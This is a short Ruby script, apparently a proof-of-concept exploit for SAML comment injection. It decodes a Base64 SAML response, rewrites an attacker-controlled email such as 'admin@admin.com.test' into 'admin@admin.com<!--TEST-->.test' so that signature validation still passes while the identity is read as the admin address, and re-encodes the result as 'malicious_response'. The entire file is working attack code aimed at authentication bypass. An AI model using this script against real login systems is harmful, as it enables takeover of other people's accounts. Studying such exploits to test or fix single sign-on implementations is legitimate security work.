require 'cgi'
require 'base64'

str = CGI.unescape ARGV[0]
response = Base64.decode64(str)

#---------------------------------------------------------------------------#
# test@test.com -> admin@admin.com                                          #
# admin@admin.com.test -> admin@admin.com<!--TEST-->.test = admin@admin.com #
#---------------------------------------------------------------------------#

malicious_response = response.gsub!("admin@admin.com.test", "admin@admin.com<!--TEST-->.test")

puts (CGI.escape(Base64.strict_encode64(malicious_response))).gsub("+/=","")
